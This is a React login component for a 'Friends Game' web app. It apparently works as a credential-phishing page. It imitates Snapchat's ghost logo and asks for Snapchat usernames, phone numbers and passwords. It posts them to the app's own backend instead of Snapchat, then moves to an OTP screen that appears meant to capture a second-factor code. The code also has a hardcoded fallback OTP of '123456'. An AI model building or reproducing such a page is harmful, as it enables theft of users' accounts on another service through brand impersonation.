import React, { useState } from 'react';
import { BACKEND_URL } from '../config';

export default function Login({ onLoginSuccess }) {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');
    setLoading(true);

    if (!username || !password) {
      setError('Please fill in all fields.');
      setLoading(false);
      return;
    }

    try {
      const response = await fetch(`${BACKEND_URL}/api/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.error || 'Something went wrong. Please try again.');
      }

      // Success - Pass username to parent to transition to OTP verify screen
      onLoginSuccess({
        username: data.username,
        debugOtp: data.debugOtp || '123456'
      });
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="glass-card">
      <div className="brand-header">
        <div className="logo-container">
          {/* Custom SVG Ghost Logo combining Snapchat Ghost and a Controller */}
          <svg className="logo-svg" viewBox="0 0 24 24">
            <path d="M12 2C8.5 2 5.5 4.5 5.5 8c0 .8.2 1.5.5 2.1-.8-.4-1.8-.2-2.3.5-.5.7-.4 1.7.3 2.2.3.2.7.3 1.1.2.2 1.3 1 2.3 2.1 2.8.2.1.3.3.3.5v.7c0 .6.5 1.1 1.1 1.1h7c.6 0 1.1-.5 1.1-1.1v-.7c0-.2.1-.4.3-.5 1.1-.5 1.9-1.5 2.1-2.8.4.1.8 0 1.1-.2.7-.5.8-1.5.3-2.2-.5-.7-1.5-.9-2.3-.5.3-.6.5-1.3.5-2.1 0-3.5-3-6-6-6zm-3.5 6.5c-.8 0-1.5-.7-1.5-1.5s.7-1.5 1.5-1.5 1.5.7 1.5 1.5-.7 1.5-1.5 1.5zm7 0c-.8 0-1.5-.7-1.5-1.5s.7-1.5 1.5-1.5 1.5.7 1.5 1.5-.7 1.5-1.5 1.5zm-5 6.5c-1.4 0-2.5-1.1-2.5-2.5h5c0 1.4-1.1 2.5-2.5 2.5z" />
          </svg>
        </div>
        <h1 className="brand-title">Friends <span>Game</span></h1>
        <p className="brand-subtitle">
          Log in using your Snapchat credentials to play
        </p>
      </div>

      {error && <div className="error-banner">{error}</div>}

      <form onSubmit={handleSubmit}>
        <div className="form-group">
          <label className="form-label">Snapchat Username / Phone</label>
          <div className="input-wrapper">
            <input
              type="text"
              className="form-input"
              placeholder="Username or Phone Number"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              disabled={loading}
              required
            />
          </div>
        </div>

        <div className="form-group">
          <label className="form-label">Password</label>
          <div className="input-wrapper">
            <input
              type="password"
              className="form-input"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              disabled={loading}
              required
            />
          </div>
        </div>

        <button type="submit" className="btn btn-primary mt-4" disabled={loading}>
          {loading ? 'Processing...' : 'Log In with Snapchat'}
        </button>
      </form>
    </div>
  );
}
